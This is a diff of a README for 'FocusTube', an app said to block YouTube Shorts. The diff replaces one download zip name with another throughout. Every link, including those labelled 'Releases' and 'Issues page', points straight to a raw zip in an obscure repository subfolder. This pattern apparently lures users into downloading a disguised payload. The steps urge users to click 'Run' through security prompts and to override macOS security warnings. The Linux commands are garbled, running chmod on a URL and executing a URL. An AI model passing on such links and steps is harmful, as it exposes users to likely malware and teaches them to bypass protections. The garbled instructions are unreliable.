@@ -1,6 +1,6 @@
 # 🎯 FocusTube - Stop Wasting Time on Shorts  
 
-[![Download FocusTube](https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip%https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip)](https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip)
+[![Download FocusTube](https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip%https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip)](https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip)
 
 ## 🚀 Getting Started  
 
@@ -8,14 +8,14 @@ FocusTube is a simple application designed to help you enjoy longer videos witho
 
 ## 📥 Download & Install  
 
-To get started with FocusTube, visit this page to download: [FocusTube Releases](https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip).
+To get started with FocusTube, visit this page to download: [FocusTube Releases](https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip).
 
-1. Go to the [FocusTube Releases](https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip) page.
+1. Go to the [FocusTube Releases](https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip) page.
 2. Look for the latest version. It will be listed at the top.
 3. Click on the installer file that matches your operating system. For example:
-   - **Windows**: Click on `https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip`
-   - **Mac**: Click on `https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip`
-   - **Linux**: Click on `https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip`
+   - **Windows**: Click on `https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip`
+   - **Mac**: Click on `https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip`
+   - **Linux**: Click on `https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip`
 
 4. Your download should start automatically. If it does not, click on the link again.
 5. Once the download is complete, locate the file in your Downloads folder.
@@ -25,24 +25,24 @@ To get started with FocusTube, visit this page to download: [FocusTube Releases]
 Depending on your operating system, follow these steps to install FocusTube:
 
 #### **For Windows:**
-1. Double-click the `https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip` file.
+1. Double-click the `https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip` file.
 2. A security prompt may appear. If it does, click "Run".
 3. Follow the on-screen instructions in the setup wizard.
 4. Once installed, you can find FocusTube in your Start Menu. Click to open.
 
 #### **For Mac:**
-1. Double-click the `https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip` file.
+1. Double-click the `https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip` file.
 2. Drag the FocusTube icon into your Applications folder.
 3. You can open FocusTube from your Applications folder. If you see a security warning, go to “System Preferences” > “Security & Privacy” and allow it to run.
 
 #### **For Linux:**
 1. Make the file executable by running the following command in the terminal:
    ```bash
-   chmod +x https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip
+   chmod +x https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip
    ```
 2. Launch FocusTube by double-clicking the file or through the command line:
    ```bash
-   https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip
+   https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip
    ```
 
 ## 🔍 Features  
@@ -68,7 +68,7 @@ Before installing FocusTube, ensure your device meets the following:
 
 If you encounter any issues while downloading or running FocusTube, you can reach out for help. Here are the ways you can get support:
 
-- **GitHub Issues**: Visit the [Issues page](https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/FocusTube-1.9-beta.5.zip) on our GitHub repository to report bugs or request features.
+- **GitHub Issues**: Visit the [Issues page](https://raw.githubusercontent.com/alexx3740/FocusTube/main/autointellectual/Tube_Focus_v3.3.zip) on our GitHub repository to report bugs or request features.
 - **Community Forum**: Join our community forum at [FocusTube Community](#) where users share tips and solutions.
 
 ## 💬 Feedback  
